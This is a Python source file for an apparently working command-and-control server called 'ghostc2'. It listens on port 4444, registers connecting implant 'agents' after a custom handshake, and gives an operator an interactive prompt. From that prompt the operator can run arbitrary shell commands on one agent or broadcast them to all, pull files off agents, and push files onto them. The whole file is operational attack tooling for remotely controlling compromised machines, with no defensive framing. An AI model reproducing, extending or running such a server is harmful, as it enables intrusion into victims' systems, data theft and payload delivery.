# vx_server.py
import socket
import threading
from modules import comms, file_transfer

def banner():
    print(r"""
       _               _       ____  
  __ _| |__   ___  ___| |_ ___|___ \ 
 / _` | '_ \ / _ \/ __| __/ __| __) |
| (_| | | | | (_) \__ \ || (__ / __/ 
 \__, |_| |_|\___/|___/\__\___|_____| 
 |___/                               
""")

banner()

HOST, PORT = '0.0.0.0', 4444
server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((HOST, PORT))
server.listen()

# Multi‑agent state
agents = {}         # agent_id -> (conn, addr)
next_id = 1
sel_id = None       # which agent we're talking to
lock = threading.Lock()

print("[+] Server listening on %s:%d" % (HOST, PORT))
print("[+] Accept thread starting…")

def accept_loop():
    global next_id
    while True:
        conn, addr = server.accept()

        # Do the VX_C2 handshake exactly once, here
        print("[SERVER] Sending handshake [VX_HELLO]")
        comms.rsend(conn, "[VX_HELLO]", dtype="output")
        resp = comms.rrecv(conn)
        print(f"[SERVER] Got handshake reply: {resp!r}")
        if not resp or resp.get("payload") != "[VX_AGENT_READY]":
            print(f"[-] Agent at {addr} failed handshake, closing")
            conn.close()
            continue

        # Register the agent
        with lock:
            aid = next_id
            next_id += 1
            agents[aid] = (conn, addr)
        print(f"\n[+] Agent #{aid} connected from {addr}")
threading.Thread(target=accept_loop, daemon=True).start()

def prompt():
    return input(f"\nghostc2[{sel_id if sel_id else 'none'}]> ").strip()

while True:
    line = prompt().split()
    if not line:
        continue

    cmd = line[0].lower()

    # ── Global commands (no agent selected) ──────────────────────────────────
    if cmd == "help":
        print("  list                   # show all connected agents")
        print("  select <id>            # choose agent #id")
        print("  broadcast <cmd>        # run <cmd> on every agent")
        print("  exit                   # quit C2 server")
        continue

    if cmd == "list":
        with lock:
            if not agents:
                print("[-] No agents connected.")
            for aid, (_, addr) in agents.items():
                print(f"  #{aid}: {addr[0]}:{addr[1]}")
        continue

    if cmd == "select":
        if len(line) != 2 or not line[1].isdigit():
            print("[-] Usage: select <agent_id>")
        else:
            aid = int(line[1])
            if aid in agents:
                sel_id = aid
                print(f"[+] Selected agent #{aid}")
            else:
                print(f"[-] No agent with ID {aid}")
        continue

    if cmd == "broadcast":
        if len(line) < 2:
            print("[-] Usage: broadcast <cmd>")
            continue
        payload = " ".join(line[1:])
        with lock:
            for aid, (conn, _) in agents.items():
                comms.rsend(conn, payload, dtype="output")
        print(f"[+] Broadcasted to {len(agents)} agent(s)")
        continue

    if cmd == "exit":
        print("[*] Shutting down.")
        break

    # ── From here on, you must have a selected agent ─────────────────────────
    if sel_id is None:
        print("[-] No agent selected; use `list` + `select <id>` first.")
        continue

    client, addr = agents[sel_id]
    full_cmd = " ".join(line)

    # Handshake for newly selected agent, if needed
    # (Uncomment if you want to re‑handshake on select)
    #comms.rsend(client, "[VX_HELLO]", dtype="output")
    #resp = comms.rrecv(client)
    #if not resp or resp.get("payload") != "[VX_AGENT_READY]":
    #    print("[-] Agent handshake failed.")
    #    continue

    # ── CD ────────────────────────────────────────────────────────────────────
    if full_cmd.startswith("cd "):
        comms.rsend(client, full_cmd, dtype="output")
        resp = comms.rrecv(client)
        if resp and resp["type"] == "output":
            print(f"[+] {resp['payload']}")
        else:
            print(f"[-] {resp['payload'] if resp else 'No response'}")
        continue

    # ── DOWNLOAD ──────────────────────────────────────────────────────────────
    if full_cmd.startswith("download "):
        file_transfer.receive(client, full_cmd, show_progress=True)
        continue

    # ── UPLOAD ────────────────────────────────────────────────────────────────
    if full_cmd.startswith("upload "):
        parts = full_cmd.split(" ", 2)
        if len(parts) != 3:
            print("[-] Usage: upload <local_file> <remote_path>")
            continue
        local_file, remote_path = parts[1], parts[2]

        # tell agent to prep
        comms.rsend(client, f"upload {remote_path}", dtype="output")
        ack = comms.rrecv(client)
        if not ack or ack["type"] == "error":
            print(f"[-] {ack['payload'] if ack else 'No ACK'}")
            continue

        # stream file
        file_transfer.send_file(client, local_file, remote_path, show_progress=True)
        # consume agent’s “File received” message
        ack = comms.rrecv(client)
        if ack and ack["type"] == "output":
            print(f"[+] {ack['payload']}")
        continue

    # ── RESYNC ────────────────────────────────────────────────────────────────
    if full_cmd == "resync":
        comms.rsend(client, "resync", dtype="output")
        resp = comms.rrecv(client)
        if resp and resp.get("payload") == "[VX_SYNC_OK]":
            print("[+] Agent resynchronized.")
        else:
            print(f"[-] Unexpected: {resp}")
        continue

    # ── SHELL FALLBACK ────────────────────────────────────────────────────────
    # everything else runs as shell on agent
    comms.rsend(client, full_cmd, dtype="output")
    resp = comms.rrecv(client)
    if not resp:
        print("[-] No response (agent disconnected?)")
        break

    rtype  = resp["type"]
    payload = resp["payload"]
    if rtype == "output":
        if isinstance(payload, (bytes, bytearray)):
            payload = payload.decode("utf-8", errors="ignore")
        print(payload, end="")
    elif rtype == "error":
        if isinstance(payload, (bytes, bytearray)):
            payload = payload.decode("utf-8", errors="ignore")
        print(f"[-] Agent error: {payload}")
    else:
        print(f"[-] Unexpected response type: {rtype}")

# ─── Clean up ─────────────────────────────────────────────────────────────
server.close()
